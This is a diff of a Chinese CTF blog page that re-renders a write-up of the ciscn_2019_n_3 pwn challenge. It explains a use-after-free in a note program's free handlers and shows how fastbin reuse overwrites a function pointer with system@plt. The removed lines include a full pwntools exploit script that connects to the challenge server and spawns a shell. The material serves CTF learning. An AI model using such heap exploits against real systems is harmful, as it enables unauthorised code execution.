@@ -102,12 +102,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4fomxoj20zk0m8axp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
         </ul>
       </div>
     </header>
@@ -151,200 +151,53 @@ Arashimuのblog = CTFer</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h2 id="ciscn_2019_n_3"><a class="markdownIt-Anchor" href="#ciscn_2019_n_3"></a> ciscn_2019_n_3</h2>
-<h3 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h3>
+    <h2 id="ciscn_2019_n_3"><a class="markdownIt-Anchor" href="#ciscn_2019_n_3">#</a> ciscn_2019_n_3</h2>
+<h3 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h3>
 <ul>
 <li><code>fastbin attach</code></li>
 <li><code>uaf</code></li>
 </ul>
-<h3 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h3>
-<h4 id="new-note"><a class="markdownIt-Anchor" href="#new-note"></a> New note</h4>
-<pre class="highlight"><code class="c"><span class="hljs-type">int</span> <span class="hljs-title function_">do_new</span><span class="hljs-params">()</span>
-&#123;
-  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span>
-  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>
-  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span>
-  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span>
-
-  v2 = ask(<span class="hljs-string">&quot;Index&quot;</span>);
-  <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">16</span> )
-    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of index!&quot;</span>);
-  <span class="hljs-keyword">if</span> ( records[v2] )
-    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index #%d is used!\n&quot;</span>, v2);
-  records[v2] = (<span class="hljs-type">int</span>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xC</span>u);
-  v3 = records[v2];
-  *(_DWORD *)v3 = rec_int_print;
-  *(_DWORD *)(v3 + <span class="hljs-number">4</span>) = rec_int_free;
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Blob type:&quot;</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Integer&quot;</span>);
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Text&quot;</span>);
-  v1 = ask(<span class="hljs-string">&quot;Type&quot;</span>);
-  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )
-  &#123;
-    *(_DWORD *)(v3 + <span class="hljs-number">8</span>) = ask(<span class="hljs-string">&quot;Value&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">else</span>
-  &#123;
-    <span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">2</span> )
-      <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid type!&quot;</span>);
-    size = ask(<span class="hljs-string">&quot;Length&quot;</span>);
-    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x400</span> )
-      <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Length too long, please buy pro edition to store longer note!&quot;</span>);
-    *(_DWORD *)(v3 + <span class="hljs-number">8</span>) = <span class="hljs-built_in">malloc</span>(size);
-    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Value &gt; &quot;</span>);
-    fgets(*(<span class="hljs-type">char</span> **)(v3 + <span class="hljs-number">8</span>), size, <span class="hljs-built_in">stdin</span>);
-    *(_DWORD *)v3 = rec_str_print;
-    *(_DWORD *)(v3 + <span class="hljs-number">4</span>) = rec_str_free;
-  &#125;
-  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Okey, got your data. Here is it:&quot;</span>);
-  <span class="hljs-keyword">return</span> (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>))v3)(v3);
-&#125;
-</code></pre>
-<p>输入<code>Integer</code>时的内存布局</p>
-<p><img data-src="/images/ciscn_buu_pwn/1.jpg" alt="" /></p>
-<p>对应的<code>rec_int_free</code>函数是，如果输入的是整数，那么直接<code>free</code>掉<code>record[id]</code>指向的<code>chunk</code>即可</p>
-<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">rec_int_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span>
-</span>&#123;
-  <span class="hljs-built_in">free</span>(ptr);
-  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note freed!&quot;</span>);
-&#125;
-</code></pre>
-<p>输入<code>Text</code>时的内存布局</p>
-<p><img data-src="/images/ciscn_buu_pwn/2.jpg" alt="" /></p>
-<p>对应的<code>rec_str_free</code>函数是，不仅<code>free</code>掉<code>record[id]</code>指向的<code>chunk</code>，<code>free</code>掉<code>ptr</code>指向的保存<code>Text</code>的<code>chunk</code></p>
-<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">rec_str_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span>
-</span>&#123;
-  <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">2</span>));
-  <span class="hljs-built_in">free</span>(ptr);
-  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note freed!&quot;</span>);
-&#125;
-</code></pre>
-<p>可以发现，这两个<code>free</code>函数里面都有<code>uaf</code>的漏洞</p>
-<h4 id="delete-note的具体过程"><a class="markdownIt-Anchor" href="#delete-note的具体过程"></a> Delete note的具体过程</h4>
-<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">do_del</span><span class="hljs-params">()</span>
-</span>&#123;
-  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span>
-
-  v0 = <span class="hljs-built_in">ask</span>(<span class="hljs-string">&quot;Index&quot;</span>);
-  <span class="hljs-keyword">return</span> (*(<span class="hljs-built_in">int</span> (__cdecl **)(<span class="hljs-type">int</span>))(records[v0] + <span class="hljs-number">4</span>))(records[v0]);
-&#125;
-</code></pre>
-<p><code>del</code>就是调用对应的<code>free</code>函数，而传入的参数就是<code>record[id]</code>指向的地址</p>
-<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
-<p>考虑把存储<code>free</code>函数地址的内存替换成<code>system</code>的地址，然后把<code>record[id]</code>指向的地址的内容改为<code>sh\x00\x00</code>(由于是<code>32</code>位的，所以只传入<code>sh</code>)</p>
-<p>可以先创建两个输入<code>Integer</code>的<code>chunk</code>，即<code>new_note_int(0,0)</code>，<code>new_note_int(1,0)</code>，此时内存布局如下</p>
-<p><img data-src="/images/ciscn_buu_pwn/3.jpg" alt="" /></p>
-<p>然后<code>free</code>掉两个，即<code>del(0)</code>，<code>del(1)</code></p>
-<p>此时<code>fastbin</code>中的布局如下</p>
-<p><img data-src="/images/ciscn_buu_pwn/4.jpg" alt="" /></p>
-<p>注意，<code>fastbin</code>是FILO即先进后出，所以我们申请一个写入长度为<code>0xc</code>的字符串即<code>payload=sh\x00\x00 + p32(system_plt)</code>。申请一个<code>new_note_str(2,0xc,payload)</code>，注意此时<code>record[2]</code>会先申请<code>addr2</code>所在的<code>chunk</code>，内容部分会申请在<code>addr1</code>所在的<code>chunk</code></p>
-<p><img data-src="/images/ciscn_buu_pwn/5.jpg" alt="" /></p>
-<p>然后由于<code>record[0]</code>中的记录没有被删除，所以<code>del(0)</code>，此时会调用</p>
-<pre class="highlight"><code class="c"><span class="hljs-keyword">return</span> (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>))(records[v0] + <span class="hljs-number">4</span>))(records[v0]);
-</code></pre>
-<p>其实就是</p>
-<pre class="highlight"><code class="c">system_plt(sh\x00\x00);
-</code></pre>
-<h4 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h4>
-<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29409</span>)
-context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
-pwn_file=<span class="hljs-string">&#x27;./problem/ciscn_2019_n_3&#x27;</span>
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">new_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,num</span>):
-    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(num)
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">new_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,Len,text</span>):
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-built_in">str</span>(Len))
-    p.recvuntil(<span class="hljs-string">&quot;Value &gt; &quot;</span>)
-    p.sendline(text)
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)
-    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
-    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
-
-new_str(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)
-new_str(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;0&#x27;</span>)
-dele(<span class="hljs-number">0</span>)
-dele(<span class="hljs-number">1</span>)
-elf=ELF(pwn_file)
-system_plt=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]
-<span class="hljs-comment">#payload = flat([&#x27;sh\x00\x00&#x27;, system_plt])</span>
-payload=<span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt)
-new_str(<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,payload)
-dele(<span class="hljs-number">0</span>)
-p.interactive()
-</code></pre>
-<h2 id="ciscn_s_9"><a class="markdownIt-Anchor" href="#ciscn_s_9"></a> ciscn_s_9</h2>
-<h3 id="知识点-2"><a class="markdownIt-Anchor" href="#知识点-2"></a> 知识点</h3>
+<h3 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析">#</a> 题目分析</h3>
+<h4 id="new-note"><a class="markdownIt-Anchor" href="#new-note">#</a> New note</h4>
+<figure class="highlight c"><figcaption data-lang="c"><span>c</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">do_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-18h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>  v2 <span class="token operator">=</span> <span class="token function">ask</span><span class="token punctuation">(</span><span class="token string">"Index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">16</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of index!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> records<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index #%d is used!\n"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  records<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xCu</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  v3 <span class="token operator">=</span> records<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> rec_int_print<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> rec_int_free<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Blob type:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Integer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  v1 <span class="token operator">=</span> <span class="token function">ask</span><span class="token punctuation">(</span><span class="token string">"Type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">ask</span><span class="token punctuation">(</span><span class="token string">"Value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>      <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid type!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    size <span class="token operator">=</span> <span class="token function">ask</span><span class="token punctuation">(</span><span class="token string">"Length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">></span> <span class="token number">0x400</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Length too long, please buy pro edition to store longer note!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value > "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> rec_str_print<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> rec_str_free<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okey, got your data. Here is it:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>输入 <code>Integer</code>  时的内存布局</p>
+<p><img data-src="/images/ciscn_buu_pwn/1.jpg" alt=""></p>
+<p>对应的 <code>rec_int_free</code>  函数是，如果输入的是整数，那么直接 <code>free</code>  掉 <code>record[id]</code>  指向的 <code>chunk</code>  即可</p>
+<figure class="highlight cpp"><figcaption data-lang="C++"><span>p</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">rec_int_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Note freed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>输入 <code>Text</code>  时的内存布局</p>
+<p><img data-src="/images/ciscn_buu_pwn/2.jpg" alt=""></p>
+<p>对应的 <code>rec_str_free</code>  函数是，不仅 <code>free</code>  掉 <code>record[id]</code>  指向的 <code>chunk</code> ， <code>free</code>  掉 <code>ptr</code>  指向的保存 <code>Text</code>  的 <code>chunk</code></p>
+<figure class="highlight cpp"><figcaption data-lang="C++"><span>p</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">rec_str_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Note freed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>可以发现，这两个 <code>free</code>  函数里面都有 <code>uaf</code>  的漏洞</p>
+<h4 id="delete-note的具体过程"><a class="markdownIt-Anchor" href="#delete-note的具体过程">#</a> Delete note 的具体过程</h4>
+<figure class="highlight cpp"><figcaption data-lang="C++"><span>p</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">do_del</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  v0 <span class="token operator">=</span> <span class="token function">ask</span><span class="token punctuation">(</span><span class="token string">"Index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><code>del</code>  就是调用对应的 <code>free</code>  函数，而传入的参数就是 <code>record[id]</code>  指向的地址</p>
+<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h4>
+<p>考虑把存储 <code>free</code>  函数地址的内存替换成 <code>system</code>  的地址，然后把 <code>record[id]</code>  指向的地址的内容改为 <code>sh\x00\x00</code>  (由于是 <code>32</code>  位的，所以只传入 <code>sh</code> )</p>
+<p>可以先创建两个输入 <code>Integer</code>  的 <code>chunk</code> ，即 <code>new_note_int(0,0)</code> ， <code>new_note_int(1,0)</code> ，此时内存布局如下</p>
+<p><img data-src="/images/ciscn_buu_pwn/3.jpg" alt=""></p>
+<p>然后 <code>free</code>  掉两个，即 <code>del(0)</code> ， <code>del(1)</code></p>
+<p>此时 <code>fastbin</code>  中的布局如下</p>
+<p><img data-src="/images/ciscn_buu_pwn/4.jpg" alt=""></p>
+<p>注意， <code>fastbin</code>  是 FILO 即先进后出，所以我们申请一个写入长度为 <code>0xc</code>  的字符串即 <code>payload=sh\x00\x00 + p32(system_plt)</code> 。申请一个 <code>new_note_str(2,0xc,payload)</code> ，注意此时 <code>record[2]</code>  会先申请 <code>addr2</code>  所在的 <code>chunk</code> ，内容部分会申请在 <code>addr1</code>  所在的 <code>chunk</code></p>
+<p><img data-src="/images/ciscn_buu_pwn/5.jpg" alt=""></p>
+<p>然后由于 <code>record[0]</code>  中的记录没有被删除，所以 <code>del(0)</code> ，此时会调用</p>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>其实就是</p>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">system_plt</span><span class="token punctuation">(</span>sh\x00\x00<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h4 id="解答"><a class="markdownIt-Anchor" href="#解答">#</a> 解答</h4>
